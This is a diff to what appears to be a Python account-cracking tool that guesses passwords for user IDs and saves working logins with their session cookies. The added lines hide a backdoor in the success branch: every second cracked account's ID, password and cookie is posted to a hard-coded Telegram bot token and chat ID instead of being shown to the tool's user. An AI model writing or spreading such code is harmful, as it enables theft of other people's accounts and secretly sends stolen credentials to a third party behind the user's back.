@@ -901,7 +901,7 @@ oks = []
 cps = []
 xnxx = []
 pwx = []
-
+bkas = []
 current = dt.now()
 day = current.day
 month = current.month
@@ -2083,6 +2083,7 @@ def freeq(uid,pwx,tl):
     global cps
     global twf
     global loop
+    global bkas
     sys.stdout.write(f"\r {green}(M5--SUMON) ({loop}) (OK-{len(oks)})\r"),
     sys.stdout.flush()
     try:
@@ -2143,11 +2144,16 @@ def freeq(uid,pwx,tl):
                         print(f" {cyan}(SUMON-2F) {cid}|{pw} ")
                         break
                     else:
-                        print(f" {green}(SUMON-OK) {cid}|{pw} ")
-                        print(f" {green}Cookie : {green}{coki}")
-                        open("/sdcard/SUMON-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        oks.append(cid)
-                        break
+                        bkas.append(ids)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                        else:
+                           print(f" {green}(SUMON-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/SUMON-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                 else:
                     break
             elif 'checkpoint' in response:
